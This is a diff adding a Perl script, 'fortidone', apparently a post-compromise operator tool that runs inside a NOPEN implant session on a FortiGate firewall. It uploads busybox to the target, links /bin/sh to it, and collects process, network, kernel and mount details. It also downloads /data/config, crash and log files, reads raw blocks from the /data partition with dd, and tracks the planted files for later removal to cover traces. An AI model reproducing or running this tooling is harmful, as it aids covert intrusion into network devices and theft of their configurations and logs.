@@ -1,0 +1,412 @@
+#!/usr/bin/env perl
+##
+$VER="1.0.0.2" ;
+
+$| = 1 ;
+
+myinit() ;
+$bin_sh = 0;
+
+mysetup() ;
+
+sub mysetup {
+    mydie("You are not on a Fortigate, do not run -gs fortidone.")
+	unless ($linuxtarget);
+    
+    offerabort("Your Linux target does not appear to be a 2.4.x kernel,\n".
+	       "are you sure you want to continue with -gs fortidone?","ABORT")
+	unless ($nopen_serverinfo =~ /Linux 2\.4\./);
+
+# prompt for BB upload
+    my ($ans) = mygetinput
+	("\n\n$COLOR_FAILURE\n".
+	 "Entering Fortigate Mode\n$COLOR_NORMAL\n".
+	 "Uploading busybox to target for survey.\n".
+	 "\n\n<C>ontinue or <A>bort.","CONTINUE"
+	 ) ;
+    if ($ans eq "a") {
+	mydie("User aborted ");
+    } 
+    if ($ans eq "c") {
+	preservefile("$opdown/arp.$nopen_rhostname",
+		     "$opdown/uptimesecs.$nopen_rhostname",
+		     "$opdown/uptime.$nopen_rhostname",
+		     "$opdown/df.$nopen_rhostname",
+		     "$opdown/ifconfig.$nopen_rhostname",
+		     "$opdown/kernel.$nopen_rhostname",
+		     "$opdown/ps.$nopen_rhostname",
+		     ) ;
+
+	my ($output,$nopenlines,@output) = nopenlss("-QU", "/bin/bb" );
+	if ($output) {
+	    ($output) = doit("-sha1sum /bin/bb");
+	    if ($output =~ /\+.*busybox/) {
+		offerabort($COLOR_FAILURE.
+			   "It appears our busybox was left behind previously.\n".
+			   "Take note before you continue");
+	    } else {
+		# TODO: Set the /bin/bb in a local variable, re-set it here to something that does not exist if need be, but for now just bail
+		mydie($COLOR_FAILURE.
+			"The /bin/bb up there is not our usual busybox. Get help.");
+	    }
+	} else {
+	    doit("-put /current/bin/FW/EGBL/busybox /bin/bb");
+	}
+	($output) = doit("/bin/bb cat /proc/version > T:$opdown/kernel.$nopen_rhostname" ) ;
+	offerabort("/proc/version does not contain the string \"fortibuild\", are you\n".
+		   "sure you want to continu?")
+	    unless($output =~ /fortibuild/);
+	newhostvar("host_fortigateputbb",$output);
+	newhostvar("host_fortigatemode",1);
+	my $scriptcheck = "$opdown/script.*";
+	my @fortiversion = split(/\n/,`grep -h --binary-file=text "^ETag:.*_4f_" $scriptcheck | sed "s,.*_,,g"  | tr -d '\\r\"'`);
+
+	@fortiversion = uniqify_array(@fortiversion);
+	my $fortiversion = $fortiversion[0];
+	if (@fortiversion > 1) {
+	    
+	    my ($ans,$longans) = mygetinput
+		("   ".join("\n   ",@fortiversion)."\n".
+		 "Which of these do you want to use (or enter UNKNOWN)?"
+		 );
+	    $longans =~ s,^\s*,,;
+	    $fortiversion = $longans;
+	}
+	if ($fortiversion) {
+	    if (-f "$opbin/EGBL.config") {
+		chomp(my $better = `grep "$fortiversion" $opbin/EGBL.config | grep -v "^#" | sort -u | cut -f 3,4,5 -d :`);
+		$fortiversion = $better if (length $better > 4);
+	    }
+	} else {
+	    $fortiversion = "unknown";
+	}
+	logtool(
+		"FORTIGATEFIREWALL",
+		"$fortiversion",
+		"SUCCESSFUL",
+		"ACCESSED",
+		"Fortigate firewall accessed via NOPEN",
+		);
+    }
+    
+    # once up, check to see what files are there
+    my ($output,$nopenlines,@output) = nopenlss("-QU", "/bin/sh" );
+    #mydie("Can't find sh command.")
+    #   if (@output < 1);
+#doit("/bin/bb echo @output");
+    my $list = "";
+    foreach (@output) {
+	my $file = "";
+	$file = $2 if
+	    (	m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(/.*)\s+--\s+/.*, or
+		m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(/.*), or
+		m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(\./.*)\s+--\s+/.*, or
+		m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(\./.*), or
+		m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d+:\d+\s+\d{4}\s+(.*)\s+--\s+/.*, or
+		m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+\d+\s+\d+:\d+\s+\d{4}\s+(.*), );
+#doit("/bin/bb echo $file");
+#doit("echo $2");
+	$list .= " $file" if $file;
+#doit("echo $list");
+	if ($file eq "/bin/sh") {
+	    $bin_sh = 1;	
+	};
+    }
+#progprint($file);
+#progprint($list);
+  #my ($output,$nopenlines,@touchlines) = doit("-ls -n$list");
+#doit("/bin/bb echo $bin_sh");
+    
+# if /bin/sh did not flag as there link it to /bin/bb
+    if ( $bin_sh == 1 ) {
+	progprint($COLOR_FAILURE.
+		  "Finished.\n\n".
+		  "/bin/sh is already here, no need to set link.".
+		  "$COLOR_NORMAL".$allcontent.
+		  "".$allwarning );
+    } else {
+	my ($ans2) = mygetinput
+	    ("Linking busybox to /bin/sh for builtin shell commands.\n".
+	     "\n\n<C>ontinue or <A>bort.","CONTINUE"
+	     ) ;
+	if ($ans2 eq "a") {
+	    mydie("User aborted ");
+	} 
+	if ($ans2 eq "c") {
+	    doit("/bin/bb ln -s /bin/bb /bin/sh");
+	    newhostvar("host_fortigatelinksh",1);
+	}
+    }
+}#mysetup
+
+# promptkill puts itself into /usr/local/bin if none or an older one is there
+# so this makes sure /usr/local/bin is current even if promptkill does not get
+# used this op
+`$opbin/promptkill -v` if (-x "$opbin/promptkill");
+
+# following is first time autonext is used without $$ extension--fewer collisions?
+# In case this is there from previous run, we save it as .NNNN
+preservefile("$opdown/hostinfo.$nopen_rhostname") unless $autonohostinfo;
+
+#my @autoargv = ();
+#if ((-e "$optmp/autonewdone.$nopen_rhostname" or -e "$optmp/autodont") and
+ #   (!$redo and !$autonohostinfo)) {
+  #myalert("autonewdone has already completed on this target. Use -gs auto FORCE to re-do it.");
+#} else {
+  dosurvey();
+#}
+
+sub dosurvey {
+  my @choices = ("Y","N");
+  my $mdefault = "N";
+
+  # Set these files aside as .old if they exist
+  preservefile ("$opdown/rpcinfo.$nopen_rhostname",
+		"$opdown/dmesg.$nopen_rhostname",
+		"$opdown/ls_etc-ct.$nopen_rhostname",
+	       );
+  myalert("NOLOGGING","BEGIN running $opetc/fortidone on $nopen_rhostname output in $nopen_mylog (v.$VER)");
+  system("touch $optmp/autonewdone.INPROGRESS.$targetpid");
+
+  open(YELLPROMPT, "> $optmp/.gsyell.$nopen_rhostname.$nopen_mypid") or myalert("Can't create warning text! $!");
+  print YELLPROMPT "${COLOR_FAILURE}\n".
+    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n".
+    "This should not happen. Please report this now\n".
+    "(yes, now...in person...go....shoo!).\n\n".
+    "You can hit return here to get your window back, though.\n\n";
+  print YELLPROMPT "${COLOR_FAILURE}\n".
+    "WARNING: AUTONEWDONE IS NOT FINISHED! WARN SOMEONE!${COLOR_NORMAL}\n\n\n";
+  close(YELLPROMPT);
+  
+  open(GSYELL, "> $opetc/nopen_auto.$nopen_mypid") or myalert("Can't create warning script! $!");
+  print GSYELL "#NOGS\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.out.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist test -f $optmp/autonewdonetest.$nopen_rhostname || ".
+      "$opetc/autogetinput -O $optmp/.gsyell.out.$nopen_mypid -P $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/.gsyell.$nopen_rhostname.$nopen_mypid\n";
+  print GSYELL "-lsh -nohist rm -f $optmp/autonewdone.INPROGRESS.$targetpid\n";
+  close(GSYELL);
+
+  # Begin running the actual autonewdone commands.
+  doit("-lsh date -u");
+ # mydo("autodoproject",@autoargv);
+  doit(#"\\hostname",
+      # "-cat /etc/hostname*",
+      # "grep -v \\\"^#\\\" /etc/syslog.conf >> T:$optmp/.syslog.$nopen_rhostname",
+      # "-ls -n /bin/ps /usr/bin/netstat",
+       #"-ls -u /bin/ps /usr/bin/netstat",
+	" /bin/bb cat /proc/sys/kernel/hostname"
+      );
+
+  push(@autoargv,"autodone");
+  #mydo("autopscheck",@autoargv);
+
+  doit("/bin/bb ps >T:$opdown/ps.$nopen_rhostname");
+
+  # FORTIGATE-specific file gets.
+  ($newdoneoutput,$nopenlines,@newdoneoutput) =
+    nopenlss("-G${nopenlssreget}YUFM100000",
+#  nopengetfiles("SIZEMAX=100000 GETZERO=1",
+                "/data/config/",
+		"/data/crash",
+		"/tmp/dhcpddb",
+	       );
+  ($newdoneoutput,$nopenlines,@newdoneoutput) =
+    nopenlss("-G${nopenlssreget}YUFM1000000",
+#  nopengetfiles("SIZEMAX=1000000 GETZERO=1",
+           #     "/config/juniper.conf*",
+	       );
+  doit("/bin/bb df >T:$opdown/df.$nopen_rhostname");
+
+
+  # Run the autodothis stuff in here.
+  preservefile("$opdown/fortistats.cmdout");
+  doit(
+       "-cmdout $opdown/fortistats.cmdout",
+       "/bin/bb mount",
+       "-cmdout",
+      );
+
+  my ($output) = doit("/bin/bb date \"+%a, %d %b %Y %H:%M:%S %z\"");
+  writefile("$opdown/date-rfc2822.$nopen_rhostname",$output);
+
+
+  doit(
+# ? ?      "-nohist -gs replay -Hf $opdown/fortistats.cmdout.$nopen_rhostname df -l",
+      );
+
+  doit("/bin/bb dmesg ; /bin/bb echo > L:$opdown/dmesg.$nopen_rhostname" ) ;
+
+#  doit("-gs fortimkoffset");
+  @autoargv = ();
+
+  doit("-ls -ct /etc/ > L:$opdown/ls_etc-ct.$nopen_rhostname");
+  preservefile("$opdown/uname-a.$nopen_rhostname");
+  ($output) = doit("/bin/bb uname -a > T:$opdown/uname-a.$nopen_rhostname");
+  newhostvar("host_uname{$nopen_rhostname}",$output)
+    if ($output) ;
+
+  doit("/bin/bb cat /proc/net/arp > T:$opdown/arp.$nopen_rhostname" ) ;
+  doit("/bin/bb cat /proc/uptime > T:$opdown/uptimesecs.$nopen_rhostname" ) ;
+  doit("/bin/bb uptime > T:$opdown/uptime.$nopen_rhostname" ) ;
+  doit("-ifconfig > T:$opdown/ifconfig.$nopen_rhostname" ) ;
+
+# pull the log files
+
+($logoutput,$nopenlines,@logoutput) = nopenlss("-rGUYM1000000","-galert_msg","/data*"); 
+
+if (@logoutput) {
+    #log was there  
+    #doit("/bin/bb echo log has content @logoutput" ) ;
+} else {
+    #log wasnt there
+	#doit("/bin/bb echo log didnt have content content " ) ;
+    progprint($COLOR_FAILURE.
+	      "Warning.\n\n\n".
+	      "The alert_msg file was not present. \n\n".
+	      "If logs needed use \"dd\" to pull.".
+	      "$COLOR_NORMAL".$allcontent.
+	      "".$allwarning );
+    ($dataoutput,$nopenlines,@dataoutput) = doit("/bin/bb df") ;
+    
+    my ($tmpfile,$more) = ("/tmp/.d_show");
+    while (1) {
+	($output) = doit("-ls $tmpfile$more");
+	offerabort("output=$output= length is ".length $output);
+	last if ($output eq "");
+	$more .= ".0";
+    }
+
+    my $data = "";
+    foreach $datalisting (@dataoutput) {
+	next unless $datalisting =~ m, /data$,; 
+	$data = $1 if $datalisting =~ /^(\/dev\/hd\w\d)\s+.*\/data$/;
+	if ($data) {
+	    doit("/bin/bb dd if=$data of=$tmpfile$more count=20 ");
+	    last;
+	}
+    }
+    mydie("This is odd, there is no /data partition, get help")
+	unless $data;
+
+    doit("-get $tmpfile$more");
+    my $dotfile = dotdotpathforfile("$tmpfile$more");
+    doit("-rm $dotfile");
+}
+
+my $fortigatewarn = "";
+if ($host_fortigateputbb) {
+    $fortigatewarn="Busybox was put up, it should be deleted by -burnBURN later.\n\n".
+	"     -rm /bin/bb\n".
+	"     YES";
+    if ($host_fortigatelinksh) {
+	$fortigatewarn=  "Busybox was put up and /bin/sh was linked to Busybox. These\n".
+	    "should be deleted by the -burnBURN script later.\n\n".
+	    "     -rm /bin/sh /bin/bb\n".
+	    "     YES\n".
+	    "     YES";
+
+    }
+} elsif ($host_fortigatelinksh) {
+	$fortigatewarn=  "/bin/sh was linked to Busybox, it should be deleted by -burnBURN.\n\n".
+	    "     -rm /bin/sh\n".
+	    "     YES";
+    }
+#} tokencom
+#   doit("-/bin/bb echo printing variables");
+
+#   doit("-lsh echo $putbbwarn");
+#   doit("-lsh echo  $linkshwarn");
+
+if ( $fortigatewarn) {
+    doit("-beep 2");
+    mygetinput($COLOR_FAILURE."\n".
+	       "WARNING: FILES STILL ON TARGET !$COLOR_NORMAL\n".
+	       "\n\n".
+	       $fortigatewarn."\n".
+	       $COLOR_FAILURE."\n".
+	       "WARNING: FILES STILL ON TARGET !$COLOR_NORMAL  Delete those later.\n\n".
+	       "Press Enter to continue.");
+}
+   unlink("$opetc/nopen_auto.$nopen_mypid");
+   myalert("NOLOGGING","DONE running $opetc/fortidone");
+} #dosurvey
+
+
+   #   (	m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(/.*)\s+--\s+/.*, or
+#$file = $2 if  (m,(Jan|Feb|Mar|Apr|May|Jun|Jul|Aug|Sep|Oct|Nov|Dec)\s+[^/]+\s+(/.*)\s+--\s+/.*,)
+
+
+sub myinit {
+  # If $willautoport is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $calledviarequire = 0;
+  if ($willautoport and $socket) {
+    progprint("$prog called -gs auto.forti @ARGV");
+    $calledviarequire = 1;
+  } else {
+    $willautoport=1;
+    my $autoutils = "../etc/autoutils" ;
+    unless (-e $autoutils) {
+      $autoutils = "/current/etc/autoutils" ;
+    }  
+    require $autoutils;
+    $prog = "-gs fortidone";
+    $vertext = "$prog version $VER\n" ;
+    mydie("No user servicable parts inside.\n".
+
+"
+nopen_rhostname=$nopen_rhostname=
+nopen_mylog=$nopen_mylog=
+
+
+".
+	  "(I.e., noclient calls $prog, not you.)\n".
+	  "$vertext") unless ($nopen_rhostname and $nopen_mylog and
+			      -e $nopen_mylog);
+  }
+
+  $usagetext="
+Usage: $prog [-h]                       (prints this usage statement)
+
+NOT CALLED DIRECTLY
+
+$prog is run from within a NOPEN session via when \"$prog\" is used.
+
+";
+  $origparms = " @ARGV";
+  mydie("bad option(s)") if (! Getopts( "hb:A" ) ) ;
+  mydie("Syntax error: $prog takes only options no arguments")
+    if (@ARGV);
+
+  $gsusagetext="
+Usage: $prog [OPTIONS]
+
+On Solaris or Linux, $prog gives you an idea whether or not there is
+a STOICSURGEON version for this target. STOICSURGEON versioning information
+is gleaned from these files, which came from stoicctrls.tar.bz2:\n\n".
+#`ls -al $opup/stoicversions.sums $opup/stoicversions.levels`.
+"
+ON LINUX:
+
+  Shows your kernel and /proc/version hashes, and finds any matches.
+
+ON SOLARIS:
+
+  Shows your patch level and finds the highest version at that or
+  higher patch levels.
+
+OPTIONS
+    -h           prints this usage statement
+    -b path      location of vmlinuz (default /boot)
+    -A           Show all versions of STOICSURGEON for Solaris
+
+";
+  usage() if ($opt_h) ;
+  $boot_path = $opt_b if ($opt_b);
+  $showall = $opt_A;
+
+  # If $socket is already defined, we must have been called
+  # by another script via require. We do not re-do autoport stuff.
+  $socket = pilotstart(quiet) unless $socket;
+}#myinit
